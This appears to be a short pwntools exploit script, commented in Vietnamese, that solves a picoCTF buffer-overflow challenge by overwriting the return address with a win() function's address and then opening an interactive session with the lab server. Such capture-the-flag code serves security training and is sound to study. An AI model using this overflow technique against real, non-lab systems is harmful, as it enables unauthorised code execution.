from pwn import *

# ==================== CONFIG ====================
HOST = "mysterious-sea.picoctf.net"   # không cần ghi "nc"
PORT = 52135 #port của lab bạn đang làm

# ==================== EXPLOIT ====================
p = remote(HOST, PORT)

# Nhận prompt
p.recvuntil(b"Please enter your name: ")

# Thông tin leak/find bằng gdb hoặc checksec
offset = 40                    # Khoảng cách từ buffer đến return address
win_addr = 0x401256            # Địa chỉ hàm win() - thường có "win" hoặc "flag"

# Xây dựng payload
payload = b"A" * offset + p64(win_addr)

log.info(f"Payload length: {len(payload)} bytes")
log.info(f"win() address : {hex(win_addr)}")

p.sendline(payload)

# Tương tác
p.interactive()